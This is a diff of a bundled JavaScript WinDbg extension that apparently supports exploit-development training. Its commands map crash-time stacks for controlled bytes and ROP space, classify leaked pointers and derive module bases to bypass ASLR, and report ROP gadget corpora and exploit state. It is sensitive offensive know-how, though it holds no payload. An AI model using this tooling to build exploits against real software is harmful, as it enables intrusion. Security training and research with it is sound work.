+        slot.detail = `${mod.name}+0x${slot.moduleOffset.toString(16).toUpperCase()} \u2190 CALL verified`;
+      } else {
+        slot.classification = "STALE_PTR";
+        slot.callSiteVerified = false;
+        slot.detail = `${mod.name}+0x${slot.moduleOffset.toString(16).toUpperCase()} (no CALL site)`;
+      }
+      return slot;
+    }
+    return slot;
+  }
+  function mapStack(sp, spName, ip, ipName, depth, patternLength) {
+    const pointerSize = getPointerSize();
+    const slotSize = pointerSize;
+    const byteCount = depth * slotSize;
+    const haystacks = {
+      msf: generateMsfPattern(Math.min(patternLength, 20280)),
+      cyclic: generateCyclicPattern(Math.max(patternLength, 2e4))
+    };
+    const stackEnd = sp + __bi(byteCount) + __bi(4096);
+    const slots = [];
+    for (let i = 0; i < depth; i++) {
+      const slotAddr = sp + __bi(i * slotSize);
+      let value;
+      try {
+        value = readPointer(slotAddr, pointerSize);
+      } catch (e) {
+        break;
+      }
+      slots.push(classifySlot(i * slotSize, slotAddr, value, pointerSize, sp, stackEnd, haystacks));
+    }
+    const controlledCount = slots.filter((s) => s.classification === "PATTERN").length;
+    const liveFrames = slots.filter((s) => s.classification === "RET" && s.callSiteVerified);
+    const liveFrameCount = liveFrames.length;
+    const firstLiveRet = slots.find((s) => s.classification === "RET" && s.callSiteVerified);
+    const firstLiveRetOffset = firstLiveRet == null ? void 0 : firstLiveRet.offset;
+    const ropRoom = firstLiveRetOffset != null ? firstLiveRetOffset : byteCount;
+    const overwrittenFrames = [];
+    let seenPattern = false;
+    for (const slot of slots) {
+      if (slot.classification === "PATTERN") {
+        seenPattern = true;
+        continue;
+      }
+      if (seenPattern && slot.classification === "RET" && slot.callSiteVerified) {
+        break;
+      }
+      if (seenPattern && slot.classification === "STALE_PTR" && slot.module) {
+        if (!overwrittenFrames.includes(slot.module)) {
+          overwrittenFrames.push(slot.module);
+        }
+      }
+    }
+    return {
+      sp,
+      spName,
+      ip,
+      ipName,
+      pointerSize,
+      slots,
+      controlledCount,
+      liveFrameCount,
+      firstLiveRetOffset,
+      ropRoom,
+      overwrittenFrames
+    };
+  }
+
+  // src/commands/stackmap.ts
+  function createStackmapCommand() {
+    return {
+      name: "stackmap",
+      description: "Maps the call stack at crash time, classifying each slot as pattern bytes, live return address, saved frame pointer, or data.",
+      usage: "dx @$osed().stackmap(depth?, patternLength?)",
+      examples: [
+        "dx @$osed().stackmap()",
+        "dx @$osed().stackmap(128)",
+        "dx @$osed().stackmap(64, 20000)"
+      ],
+      schema: {
+        depth: { type: "number", min: 8, max: 512, default: 64 },
+        patternLength: { type: "number", min: 256, max: 1e5, default: 1e4 }
+      },
+      execute(options) {
+        var _a, _b;
+        const pointerSize = getPointerSize();
+        const regs = readRegisters(pointerSize);
+        const depth = options.depth;
+        const patternLength = options.patternLength;
+        if (regs.sp === void 0) {
+          error("Stack pointer is unavailable.");
+          return {
+            command: "stackmap",
+            args: options,
+            success: false,
+            findings: [],
+            warnings: [],
+            errors: ["Stack pointer is unavailable."]
+          };
+        }
+        const result3 = mapStack(regs.sp, (_a = regs.spName) != null ? _a : pointerSize === 8 ? "RSP" : "ESP", regs.ip, (_b = regs.ipName) != null ? _b : pointerSize === 8 ? "RIP" : "EIP", depth, patternLength);
+        renderStackMap(result3);
+        return {
+          command: "stackmap",
+          args: options,
+          success: true,
+          findings: [serializeResult(result3)],
+          warnings: [],
+          errors: []
+        };
+      }
+    };
+  }
+  function renderStackMap(result3) {
+    var _a, _b, _c, _d;
+    const { pointerSize, slots, spName } = result3;
+    const ipLabel = (_a = result3.ipName) != null ? _a : pointerSize === 8 ? "RIP" : "EIP";
+    const spLabel = spName.toUpperCase();
+    section("CALL STACK MAP");
+    info(`${ipLabel}: ${result3.ip !== void 0 ? formatAddress(result3.ip, pointerSize) : "n/a"} \xB7 ${spLabel}: ${formatAddress(result3.sp, pointerSize)} \xB7 ${slots.length} slots mapped`);
+    const collapseThreshold = 4;
+    let i = 0;
+    const rows = [];
+    while (i < slots.length) {
+      const slot = slots[i];
+      if (slot.classification === "PATTERN") {
+        let runEnd = i + 1;
+        while (runEnd < slots.length && slots[runEnd].classification === "PATTERN") {
+          runEnd++;
+        }
+        const runLength = runEnd - i;
+        if (runLength <= collapseThreshold) {
+          for (let j = i; j < runEnd; j++) {
+            rows.push(formatSlotRow(slots[j], spLabel, pointerSize));
+          }
+        } else {
+          rows.push(formatSlotRow(slots[i], spLabel, pointerSize));
+          rows.push(formatSlotRow(slots[i + 1], spLabel, pointerSize));
+          const firstOffset = (_b = slots[i].patternOffset) != null ? _b : 0;
+          const lastOffset = (_c = slots[runEnd - 1].patternOffset) != null ? _c : 0;
+          const kind = (_d = slots[i].patternKind) != null ? _d : "pattern";
+          rows.push({
+            Offset: "\xB7\xB7\xB7",
+            Address: "",
+            Value: "",
+            Class: `PATTERN \xD7${runLength - 3}`,
+            Detail: `contiguous, ${kind} ${firstOffset}\u2013${lastOffset}`
+          });
+          rows.push(formatSlotRow(slots[runEnd - 1], spLabel, pointerSize));
+        }
+        i = runEnd;
+      } else {
+        rows.push(formatSlotRow(slot, spLabel, pointerSize));
+        i++;
+      }
+    }
+    table([
+      { key: "Offset", header: "Offset", width: 12 },
+      { key: "Address", header: "Address", width: pointerSize === 8 ? 18 : 10 },
+      { key: "Value", header: "Value", width: pointerSize === 8 ? 18 : 10 },
+      { key: "Class", header: "Class", width: 12 },
+      { key: "Detail", header: "Detail" }
+    ], rows);
+    section("SUMMARY");
+    info(`Controlled slots: ${result3.controlledCount}`);
+    info(`Live frames (CALL verified): ${result3.liveFrameCount}`);
+    info(`ROP room: ${result3.ropRoom} bytes${result3.firstLiveRetOffset !== void 0 ? ` (before first live RET at ${spLabel}+0x${result3.firstLiveRetOffset.toString(16).toUpperCase()})` : " (no live RET found in scan range)"}`);
+    if (result3.overwrittenFrames.length > 0) {
+      info(`Overwritten frames: ${result3.overwrittenFrames.join(" \u2192 ")}`);
+    }
+    section("CHAIN ENTRY");
+    const firstControlled = slots.find((s) => s.classification === "PATTERN");
+    const firstLiveRet = slots.find((s) => s.classification === "RET" && s.callSiteVerified);
+    if (firstControlled) {
+      info(`First controlled: ${spLabel}+0x${firstControlled.offset.toString(16).toUpperCase()} (${firstControlled.patternKind} offset ${firstControlled.patternOffset})`);
+    } else {
+      info("No pattern bytes found on the stack.");
+    }
+    if (firstLiveRet) {
+      info(`First intact frame: ${spLabel}+0x${firstLiveRet.offset.toString(16).toUpperCase()} (${firstLiveRet.module}+0x${firstLiveRet.moduleOffset.toString(16).toUpperCase()})`);
+    }
+    if (firstControlled && result3.ropRoom > 0) {
+      info(`Recommendation: ${result3.ropRoom} bytes available at ${spLabel} for inline chain or stage-one pivot`);
+    }
+  }
+  function formatSlotRow(slot, spLabel, pointerSize) {
+    return {
+      Offset: `${spLabel}+0x${slot.offset.toString(16).toUpperCase().padStart(2, "0")}`,
+      Address: formatAddress(slot.address, pointerSize),
+      Value: formatAddress(slot.value, pointerSize),
+      Class: slot.classification + (slot.callSiteVerified ? " \u2713" : ""),
+      Detail: slot.detail
+    };
+  }
+  function serializeResult(result3) {
+    const ps = result3.pointerSize;
+    return {
+      sp: formatAddress(result3.sp, ps),
+      spName: result3.spName,
+      ip: result3.ip !== void 0 ? formatAddress(result3.ip, ps) : void 0,
+      ipName: result3.ipName,
+      pointerSize: ps,
+      slotCount: result3.slots.length,
+      controlledCount: result3.controlledCount,
+      liveFrameCount: result3.liveFrameCount,
+      firstLiveRetOffset: result3.firstLiveRetOffset,
+      ropRoom: result3.ropRoom,
+      overwrittenFrames: result3.overwrittenFrames,
+      slots: result3.slots.map((slot) => ({
+        offset: slot.offset,
+        address: formatAddress(slot.address, ps),
+        value: formatAddress(slot.value, ps),
+        classification: slot.classification,
+        detail: slot.detail,
+        patternKind: slot.patternKind,
+        patternOffset: slot.patternOffset,
+        module: slot.module,
+        moduleOffset: slot.moduleOffset !== void 0 ? `0x${slot.moduleOffset.toString(16).toUpperCase()}` : void 0,
+        callSiteVerified: slot.callSiteVerified
+      }))
+    };
+  }
+
+  // src/core/leak_evidence.ts
+  function classifyPointer(value, pointerSize, findModule, inspectMemory) {
+    if (value === __bi(0))
+      return { value, pointerSize, provenance: "debugger_observed", kind: "null" };
+    const module = findModule(value);
+    const memory = inspectMemory(value);
+    if (module)
+      return { value, pointerSize, provenance: "debugger_observed", kind: "module_pointer", module: { name: module.name, rva: value - module.base, aslr: module.aslr }, memory };
+    const kind = memory.source === "unavailable" || memory.state === "unknown" ? "unknown" : memory.state === "free" ? "unmapped" : memory.state === "reserve" ? "reserved" : "memory_pointer";
+    return { value, pointerSize, provenance: "debugger_observed", kind, memory };
+  }
+  function extractHexPointers(text, pointerSize) {
+    const minimumDigits = pointerSize === 8 ? 8 : 6;
+    const maximumDigits = pointerSize * 2;
+    const expression = new RegExp(`(?:0x)?[0-9a-fA-F]{${minimumDigits},${maximumDigits}}`, "g");
+    const values = [];
+    const seen = /* @__PURE__ */ new Set();
+    for (const match of text.matchAll(expression)) {
+      const token = match[0];
+      const value = __bi(token.startsWith("0x") || token.startsWith("0X") ? token : `0x${token}`);
+      const key2 = value.toString();
+      if (!seen.has(key2)) {
+        seen.add(key2);
+        values.push(value);
+      }
+    }
+    return values;
+  }
+  function deriveModuleBase(pointer, rva, pointerSize, findModule) {
+    if (rva > pointer) {
+      return {
+        pointer,
+        rva,
+        pointerSize,
+        alignmentPlausible: false,
+        moduleMatched: false,
+        provenance: "leak_derived",
+        reason: "RVA exceeds the observed pointer."
+      };
+    }
+    const base = pointer - rva;
+    const module = findModule(pointer);
+    const moduleMatched = module !== void 0 && module.base === base && pointer - module.base === rva;
+    return {
+      pointer,
+      rva,
+      base,
+      pointerSize,
+      alignmentPlausible: __bi.and(base, __bi(4095)) === __bi(0),
+      moduleMatched,
+      module: moduleMatched && module ? { name: module.name, base: module.base, aslr: module.aslr } : void 0,
+      provenance: "leak_derived",
+      reason: moduleMatched ? void 0 : "Calculated base does not match a loaded module in the current target."
+    };
+  }
+
+  // src/commands/leak.ts
+  var MAX_SCAN_BYTES = 65536;
+  var MAX_ANALYZE_CHARS = 65536;
+  function readPointerFromBytes(bytes, pointerSize) {
+    let value = __bi(0);
+    for (let index = 0; index < pointerSize; index += 1) {
+      value = __bi.or(value, __bi.shl(__bi(bytes[index]), __bi(index * 8)));
+    }
+    return value;
+  }
+  function classificationLabel(result3) {
+    var _a;
+    if (result3.kind === "module_pointer" && result3.module) {
+      return `${(_a = result3.module.name.split(/[\\/]/).pop()) != null ? _a : result3.module.name}+0x${result3.module.rva.toString(16).toUpperCase()}`;
+    }
+    if (result3.kind === "memory_pointer")
+      return "Mapped memory";
+    if (result3.kind === "reserved")
+      return "Reserved memory";
+    if (result3.kind === "unmapped")
+      return "Unmapped";
+    if (result3.kind === "null")
+      return "Null";
+    return "Unknown";
+  }
+  function createLeakClassifyCommand() {
+    return {
+      name: "leak_classify",
+      description: "Classify a pointer value without dereferencing it.",
+      usage: "dx @$osed().leak_classify(value)",
+      examples: ["dx @$osed().leak_classify(0x76A31240)"],
+      schema: { value: { type: ["number", "string"], required: true } },
+      execute(options) {
+        var _a;
+        const pointerSize = getPointerSize();
+        const value = normalizeAddress(options.value);
+        const result3 = classifyPointer(value, pointerSize, findModuleByAddress, memoryRegion);
+        section("POINTER CLASSIFICATION");
+        print("VALUE");
+        print("  Address: " + formatAddress(value, pointerSize));
+        print("  Architecture: " + (pointerSize === 4 ? "x86" : "x64"));
+        print("  Pointer width: " + String(pointerSize * 8) + " bits");
+        if (result3.module || result3.memory)
+          print("TARGET");
+        print("  Classification: " + (result3.kind === "module_pointer" ? "Loaded module" : result3.kind === "memory_pointer" ? "Mapped memory" : result3.kind === "reserved" ? "Reserved memory" : result3.kind === "unmapped" ? "Unmapped" : result3.kind === "null" ? "Null pointer" : "Unknown"));
+        if (result3.module) {
+          print("  Module: " + ((_a = result3.module.name.split(/[\\\\/]/).pop()) != null ? _a : result3.module.name));
+          print("  Module RVA: 0x" + result3.module.rva.toString(16).toUpperCase().padStart(pointerSize * 2, "0"));
+          print("  ASLR: " + result3.module.aslr);
+        }
+        if (result3.memory) {
+          print("  State: " + (result3.memory.state === "commit" ? "MEM_COMMIT" : result3.memory.state === "reserve" ? "MEM_RESERVE" : result3.memory.state === "free" ? "MEM_FREE" : "unknown"));
+          print("  Type: " + (result3.memory.regionType === "unknown" ? "unknown" : "MEM_" + result3.memory.regionType.toUpperCase()));
+          print("  Protection: " + (result3.memory.raw.protection === void 0 ? "unknown" : decodeProtectValue(result3.memory.raw.protection).name));
+          print("  Executable: " + (result3.memory.executable === true ? "Yes" : result3.memory.executable === false ? "No" : "Unknown"));
+        }
+        print("PROVENANCE");
+        print("  " + result3.provenance);
+        print("ASSESSMENT");
+        print(result3.kind === "module_pointer" ? "  Valid pointer into a loaded module." : result3.kind === "null" ? "  Null pointer." : result3.kind === "memory_pointer" ? "  Address resolves to committed memory." : result3.kind === "reserved" ? "  Address is reserved but not committed." : result3.kind === "unmapped" ? "  Address does not resolve to mapped memory." : "  Memory state could not be established.");
+        print("  No information disclosure established.");
+        return { command: "leak_classify", args: options, success: true, findings: [result3], warnings: [], errors: [] };
+      }
+    };
+  }
+  function createLeakScanCommand() {
+    return {
+      name: "leak_scan",
+      description: "Find pointer-sized candidates in an explicitly bounded memory range.",
+      usage: "dx @$osed().leak.scan(address, length?)",
+      examples: ["dx @$osed().leak.scan(0x0014DD28, 0x400)"],
+      schema: {
+        address: { type: ["number", "string"], required: true },
+        length: { type: "number", min: 1, max: MAX_SCAN_BYTES, default: 1024 }
+      },
+      execute(options) {
+        const pointerSize = getPointerSize();
+        const address = normalizeAddress(options.address);
+        const length = options.length;
+        const rows = [];
+        const warnings = [];
+        let unreadable = 0;
+        for (let offset = 0; offset + pointerSize <= length; offset += pointerSize) {
+          const source = address + __bi(offset);
+          const bytes = tryReadMemory(source, pointerSize);
+          if (!bytes) {
+            unreadable++;
+            continue;
+          }
+          const value = readPointerFromBytes(bytes, pointerSize);
+          if (value === __bi(0))
+            continue;
+          const result3 = classifyPointer(value, pointerSize, findModuleByAddress, memoryRegion);
+          if (result3.kind === "module_pointer" || result3.kind === "memory_pointer") {
+            rows.push({ source, value, result: result3 });
+          }
+        }
+        if (unreadable > 0)
+          warnings.push(`${unreadable} pointer-sized cells could not be read.`);
+        const modulePointers = rows.filter((row) => row.result.kind === "module_pointer").length;
+        const aslrPointers = rows.filter((row) => {
+          var _a;
+          return ((_a = row.result.module) == null ? void 0 : _a.aslr) === "enabled";
+        }).length;
+        section("POINTER CANDIDATES");
+        table([
+          { key: "source", header: "Source", width: pointerSize === 8 ? 18 : 12 },
+          { key: "value", header: "Value", width: pointerSize === 8 ? 18 : 12 },
+          { key: "target", header: "Target", width: 34 },
+          { key: "aslr", header: "ASLR", width: 8 }
+        ], rows.map((row) => {
+          var _a, _b, _c;
+          return {
+            source: formatAddress(row.source, pointerSize),
+            value: formatAddress(row.value, pointerSize),
+            target: classificationLabel(row.result),
+            aslr: (_c = (_b = (_a = row.result.module) == null ? void 0 : _a.aslr) == null ? void 0 : _b.toUpperCase()) != null ? _c : "n/a"
+          };
+        }));
+        section("SUMMARY");
+        print(`  Pointer-sized cells examined: ${Math.floor(length / pointerSize)}`);
+        print(`  Module pointers: ${modulePointers}`);
+        print(`  Potential ASLR disclosures: ${aslrPointers}`);
+        section("PROVENANCE");
+        print("  debugger_observed");
+        print("  No externally observable disclosure established.");
+        return { command: "leak_scan", args: options, success: true, findings: rows, warnings, errors: [], stats: { examined: Math.floor(length / pointerSize), candidates: rows.length, modulePointers, aslrPointers, unreadable } };
+      }
+    };
+  }
+  function createLeakAnalyzeCommand() {
+    return {
+      name: "leak_analyze",
+      description: "Extract and classify hexadecimal pointer candidates from supplied output text.",
+      usage: "dx @$osed().leak.analyze(text)",
+      examples: ['dx @$osed().leak.analyze("Error processing request at 76A31240")'],
+      schema: { text: { type: "string", required: true } },
+      execute(options) {
+        const text = options.text;
+        if (text.length > MAX_ANALYZE_CHARS)
+          throw new Error(`Text exceeds the ${MAX_ANALYZE_CHARS}-character analysis limit.`);
+        const pointerSize = getPointerSize();
+        const values = extractHexPointers(text, pointerSize);
+        const findings = values.map((value) => __spreadProps(__spreadValues({}, classifyPointer(value, pointerSize, findModuleByAddress, memoryRegion)), {
+          provenance: "leak_derived"
+        }));
+        const modulePointers = findings.filter((finding) => finding.kind === "module_pointer").length;
+        const aslrPointers = findings.filter((finding) => {
+          var _a;
+          return ((_a = finding.module) == null ? void 0 : _a.aslr) === "enabled";
+        }).length;
+        section("OUTPUT POINTER ANALYSIS");
+        table([
+          { key: "value", header: "Value", width: pointerSize === 8 ? 18 : 12 },
+          { key: "target", header: "Target", width: 34 },
+          { key: "aslr", header: "ASLR", width: 8 }
+        ], findings.map((finding) => {
+          var _a, _b, _c;
+          return {
+            value: formatAddress(finding.value, pointerSize),
+            target: classificationLabel(finding),
+            aslr: (_c = (_b = (_a = finding.module) == null ? void 0 : _a.aslr) == null ? void 0 : _b.toUpperCase()) != null ? _c : "n/a"
+          };
+        }));
+        section("PROVENANCE");
+        print("  leak_derived (parsed from supplied text)");
+        print("  Attacker observability and exploit usability are not established.");
+        return { command: "leak_analyze", args: options, success: true, findings, warnings: [], errors: [], stats: { extracted: values.length, modulePointers, aslrPointers } };
+      }
+    };
+  }
+  function createLeakBaseCommand() {
+    return {
+      name: "leak_base",
+      description: "Derive and validate a module base from an observed pointer and known RVA.",
+      usage: "dx @$osed().leak.base(pointer, rva)",
+      examples: ["dx @$osed().leak.base(0x76A31240, 0x1240)"],
+      schema: { pointer: { type: ["number", "string"], required: true }, rva: { type: ["number", "string"], required: true } },
+      execute(options) {
+        var _a, _b, _c;
+        const pointerSize = getPointerSize();
+        const result3 = deriveModuleBase(normalizeAddress(options.pointer), normalizeAddress(options.rva), pointerSize, findModuleByAddress);
+        section("LEAKED POINTER");
+        print(`  Address: ${formatAddress(result3.pointer, pointerSize)}`);
+        print(`  Known RVA: 0x${result3.rva.toString(16).toUpperCase()}`);
+        section("CALCULATED BASE");
+        print(`  ${result3.base === void 0 ? "unavailable" : formatAddress(result3.base, pointerSize)}`);
+        section("VALIDATION");
+        print(`  PE alignment: ${result3.alignmentPlausible ? "plausible" : "not plausible"}`);
+        print(`  Module mapping: ${result3.moduleMatched ? `matched (${(_b = (_a = result3.module) == null ? void 0 : _a.name.split(/[\\/]/).pop()) != null ? _b : "module"})` : "not matched in current target"}`);
+        if (result3.reason)
+          print(`  Note: ${result3.reason}`);
+        section("PROVENANCE");
+        print("  leak_derived");
+        print("  Exploit usability is not established.");
+        return { command: "leak_base", args: options, success: result3.base !== void 0, findings: [result3], warnings: result3.moduleMatched ? [] : ["Calculated base is not validated against a loaded module in the current target."], errors: result3.base === void 0 ? [(_c = result3.reason) != null ? _c : "Unable to calculate a base."] : [] };
+      }
+    };
+  }
+  function createLeakCommands() {
+    return [createLeakClassifyCommand(), createLeakScanCommand(), createLeakAnalyzeCommand(), createLeakBaseCommand()];
+  }
+
+  // src/rop/corpus_report.ts
+  function normalizedIdentity(value) {
+    return (value != null ? value : "?").replace(/\\/g, "/").split("/").pop().toLowerCase();
+  }
+  function normalizedStem(value) {
+    return normalizedIdentity(value).replace(/\.(dll|exe|ocx|sys)$/i, "");
+  }
+  function matchingModule(modules, name) {
+    var _a;
+    const identity = normalizedIdentity(name);
+    return (_a = modules.find((module) => normalizedIdentity(module.name) === identity)) != null ? _a : modules.find((module) => normalizedStem(module.name) === normalizedStem(name));
+  }
+  function capabilityLabel(gadget) {
+    var _a, _b, _c, _d, _e, _f, _g, _h;
+    const capabilities = gadget.capabilities;
+    const pivot = capabilities.find((cap) => cap.kind === "STACK_PIVOT");
+    if (pivot) {
+      const instructionText = gadget.instructions.map((instruction) => instruction.normalizedText || instruction.originalText).join(" ");
+      const register2 = gadget.instructions.some((instruction) => instruction.mnemonic === "leave") ? "ebp" : (_a = instructionText.match(/\b(?:xchg|mov)\s+esp\s*,\s*([a-z]{3})\b/i)) == null ? void 0 : _a[1];
+      return "PIVOT(" + ((_b = register2 == null ? void 0 : register2.toUpperCase()) != null ? _b : "?") + ")";
+    }
+    const loads = [...new Set(capabilities.filter((cap) => cap.kind === "LOAD_REGISTER" && cap.register).map((cap) => cap.register.toUpperCase()))];
+    if (loads.length > 0)
+      return "LOAD(" + loads.join(",") + ")";
+    const jump = capabilities.find((cap) => cap.kind === "DISPATCH_JMP_REGISTER");
+    if (jump)
+      return "JMP(" + ((_d = (_c = jump.register) == null ? void 0 : _c.toUpperCase()) != null ? _d : "?") + ")";
+    const write2 = capabilities.find((cap) => cap.kind === "MEMORY_WRITE");
+    if (write2)
+      return "WRITE(" + ((_f = (_e = write2.register) == null ? void 0 : _e.toUpperCase()) != null ? _f : "?") + ")";
+    if (capabilities.some((cap) => cap.kind === "STACK_ADJUST"))
+      return "ADJUST(ESP)";
+    return (_h = (_g = capabilities[0]) == null ? void 0 : _g.kind) != null ? _h : "?";
+  }
+  function espDelta(gadget) {
+    if (gadget.categories.includes("STACK_PIVOT"))
+      return "DYN";
+    const field = gadget.semanticSummary.summary.stackDelta;
+    if (field.values.unknown || field.values.conservative.size > 0 || field.values.exact.size !== 1)
+      return "?";
+    const value = [...field.values.exact][0];
+    return value > 0 ? "+" + value : String(value);
+  }
+  function hex3(value, width) {
+    return "0x" + value.toString(16).toUpperCase().padStart(width, "0");
+  }
+  function pad2(value, width) {
+    return value + " ".repeat(Math.max(0, width - value.length));
+  }
+  function validationLabel(validation) {
+    return validation === "sampled" ? "SAMPLED" : validation === "unverified" ? "UNVERIFIED" : "?";
+  }
+  function originLabel(origin) {
+    return origin === "live" ? "LIVE" : origin === "imported" ? "IMPORTED" : "RP++";
+  }
+  function formatCorpusReport(index, options) {
+    var _a, _b, _c;
+    const addressWidth = options.pointerSize * 2;
+    const modules = (_a = options.modules) != null ? _a : [];
+    const groups = /* @__PURE__ */ new Map();
+    for (const gadget of index.gadgets) {
+      gadget.locations.forEach((location, locationIndex) => {
+        var _a2;
+        const key2 = normalizedIdentity(location.module);
+        const group = (_a2 = groups.get(key2)) != null ? _a2 : [];
+        group.push({ gadget, locationIndex });
+        groups.set(key2, group);
+      });
+    }
+    const badchars = options.badchars === void 0 ? "?" : options.badchars.length === 0 ? "none" : options.badchars.map((byte) => byte.toString(16).toUpperCase().padStart(2, "0")).join(" ");
+    const lines = [
+      "=== OSED ROP CORPUS ===",
+      "Architecture: " + (options.pointerSize === 4 ? "x86" : "x64"),
+      "Corpus: " + originLabel(options.origin) + " | Validation: " + validationLabel(options.validation),
+      "Gadgets: " + [...groups.values()].reduce((total, group) => total + group.length, 0) + " | Modules: " + groups.size,
+      "Badchars: " + badchars
+    ];
+    if (groups.size === 0) {
+      lines.push("", "No gadgets in corpus.");
+      return lines.join("\n");
+    }
+    for (const [identity, entries] of [...groups.entries()].sort(([left], [right]) => left < right ? -1 : left > right ? 1 : 0)) {
+      const metadata = matchingModule(modules, entries[0].gadget.locations[entries[0].locationIndex].module);
+      const moduleName = (_c = (_b = metadata == null ? void 0 : metadata.name) != null ? _b : entries[0].gadget.locations[entries[0].locationIndex].module) != null ? _c : "?";
+      const rows = entries.map(({ gadget, locationIndex }) => {
+        const location = gadget.locations[locationIndex];
+        const va = location.virtualAddress === void 0 ? void 0 : __bi(location.virtualAddress);
+        return {
+          va,
+          rva: va === void 0 || (metadata == null ? void 0 : metadata.base) === void 0 ? void 0 : va - metadata.base,
+          instructions: gadget.instructions.map((instruction) => instruction.normalizedText || instruction.originalText).join(" ; "),
+          capability: capabilityLabel(gadget),
+          esp: espDelta(gadget)
+        };
+      }).sort((left, right) => {
+        var _a2, _b2, _c2, _d, _e, _f, _g, _h;
+        return ((_b2 = (_a2 = left.rva) != null ? _a2 : left.va) != null ? _b2 : __bi(-1)) < ((_d = (_c2 = right.rva) != null ? _c2 : right.va) != null ? _d : __bi(-1)) ? -1 : ((_f = (_e = left.rva) != null ? _e : left.va) != null ? _f : __bi(-1)) > ((_h = (_g = right.rva) != null ? _g : right.va) != null ? _h : __bi(-1)) ? 1 : left.instructions < right.instructions ? -1 : left.instructions > right.instructions ? 1 : 0;
+      });
+      const rendered = rows.map((row) => ({
+        va: row.va === void 0 ? "?" : hex3(row.va, addressWidth),
+        rva: row.rva === void 0 ? "?" : "+" + row.rva.toString(16).toUpperCase().padStart(Math.max(1, addressWidth - 2), "0"),
+        instructions: row.instructions,
+        capability: row.capability,
+        esp: row.esp
+      }));
+      const widths = {
+        va: Math.max(2, ...rendered.map((row) => row.va.length)),
+        rva: Math.max(3, ...rendered.map((row) => row.rva.length)),
+        instructions: Math.max(12, ...rendered.map((row) => row.instructions.length)),
+        capability: Math.max(10, ...rendered.map((row) => row.capability.length)),
+        esp: Math.max(3, ...rendered.map((row) => row.esp.length))
+      };
+      lines.push("", "MODULE: " + moduleName, "Base: " + ((metadata == null ? void 0 : metadata.base) === void 0 ? "?" : hex3(metadata.base, addressWidth)) + " | ASLR: " + ((metadata == null ? void 0 : metadata.aslr) === "enabled" ? "ON" : (metadata == null ? void 0 : metadata.aslr) === "disabled" ? "OFF" : "?") + " | Gadgets: " + rendered.length, "", pad2("VA", widths.va) + "  " + pad2("RVA", widths.rva) + "  " + pad2("INSTRUCTIONS", widths.instructions) + "  " + pad2("CAPABILITY", widths.capability) + "  ESP", "-".repeat(widths.va) + "  " + "-".repeat(widths.rva) + "  " + "-".repeat(widths.instructions) + "  " + "-".repeat(widths.capability) + "  " + "-".repeat(widths.esp), ...rendered.map((row) => pad2(row.va, widths.va) + "  " + pad2(row.rva, widths.rva) + "  " + pad2(row.instructions, widths.instructions) + "  " + pad2(row.capability, widths.capability) + "  " + row.esp));
+    }
+    return lines.join("\n");
+  }
+
+  // src/index.ts
+  var registry = new CommandRegistry();
+  var osed = {};
+  var lastResult;
+  var currentRopCorpus;
+  var pendingImportedCorpus;
+  var corpusOrigin = "rpplus";
+  var corpusValidation = "unknown";
+  var corpusBadchars;
+  var corpusGeneration = 0;
+  var nextRopPlanId = 1;
+  var ropPlans = /* @__PURE__ */ new Map();
+  var corpusModules = [];
+  var ropEmitter = new RankedSemanticEmitter();
+  var cachedExploitState;
+  var proofSessionStore = new ProofSessionStore();
+  var lastGeneratedProofInput;
+  var NO_ROP_CORPUS_MESSAGE = "No active ROP corpus. Run rop.scan(...) or rop.scan_live(...), or validate an imported corpus with rop.corpus.validate().";
+  var NO_EXPLOIT_STATE_MESSAGE = "No exploit state available. Run triage() first to capture crash state.";
+  function buildExploitStateFromTriage(findings) {
+    var _a, _b;
+    const control = findings.control;
+    const stack = findings.stack;
+    const seh = findings.seh;
+    const badcharStats = findings.badchars;
+    const ipControlled = (control == null ? void 0 : control.ipControlled) === true;
+    let mechanism = "saved-ret";
+    if ((seh == null ? void 0 : seh.overwritten) === "yes") {
+      mechanism = "seh";
+    }
+    const badchars = (badcharStats != null ? badcharStats : []).filter((entry) => typeof entry.byte === "number").map((entry) => entry.byte & 255);
+    const sp = stack == null ? void 0 : stack.sp;
+    const spValue = sp !== void 0 && sp !== null ? Number(sp) : void 0;
+    const landing2 = stack == null ? void 0 : stack.landing;
+    const landingBytes = landing2 == null ? void 0 : landing2.bytes;
+    const controlledAfterEsp = (_a = landingBytes == null ? void 0 : landingBytes.length) != null ? _a : 0;
+    const registers = {};
+    const regEntries = control == null ? void 0 : control.registers;
+    if (Array.isArray(regEntries)) {
+      for (const entry of regEntries) {
+        const name = (_b = entry.name) == null ? void 0 : _b.toLowerCase();
+        if (name && name !== "eip" && name !== "esp") {
+          registers[name] = { kind: "unknown" };
+        }
+      }
+    }
+    return {
+      control: {
+        mechanism,
+        instructionPointerControlled: ipControlled
+      },
+      stack: {
+        espAtControl: spValue,
+        controlledBeforeEsp: 0,
+        controlledAfterEsp,
+        contiguousControlledBytes: controlledAfterEsp,
+        readable: true,
+        writable: true,
+        executable: typeof (stack == null ? void 0 : stack.stackExecutable) === "boolean" ? stack.stackExecutable : false
+      },
+      registers,
+      constraints: {
+        badchars,
+        apiResolution: "either"
+      }
+    };
+  }
+  function mergeExploitStateOverrides(base, overrides) {
+    const merged = __spreadValues({}, base);
+    if (overrides.mechanism !== void 0) {
+      merged.control = __spreadProps(__spreadValues({}, merged.control), { mechanism: String(overrides.mechanism) });
+    }
+    if (overrides.eipControlled !== void 0) {
+      merged.control = __spreadProps(__spreadValues({}, merged.control), { instructionPointerControlled: Boolean(overrides.eipControlled) });
+    }
+    if (overrides.controlledBytesAfterEsp !== void 0) {
+      merged.stack = __spreadProps(__spreadValues({}, merged.stack), { controlledAfterEsp: Number(overrides.controlledBytesAfterEsp), contiguousControlledBytes: Number(overrides.controlledBytesAfterEsp) });
+    }
+    if (overrides.controlledBytesBeforeEsp !== void 0) {
+      merged.stack = __spreadProps(__spreadValues({}, merged.stack), { controlledBeforeEsp: Number(overrides.controlledBytesBeforeEsp) });
+    }
+    if (overrides.stackWritable !== void 0) {
+      merged.stack = __spreadProps(__spreadValues({}, merged.stack), { writable: Boolean(overrides.stackWritable) });
+    }
+    if (overrides.stackExecutable !== void 0) {
+      merged.stack = __spreadProps(__spreadValues({}, merged.stack), { executable: Boolean(overrides.stackExecutable) });
+    }
+    if (overrides.badchars !== void 0) {
+      merged.constraints = __spreadProps(__spreadValues({}, merged.constraints), { badchars: parseHexByteList(overrides.badchars) });
+    }
+    if (overrides.apiResolution !== void 0) {
+      const resolution = String(overrides.apiResolution).toLowerCase();
+      if (resolution === "direct" || resolution === "iat" || resolution === "either") {
+        merged.constraints = __spreadProps(__spreadValues({}, merged.constraints), { apiResolution: resolution });
+      }
+    }
+    if (overrides.maximumPayloadLength !== void 0) {
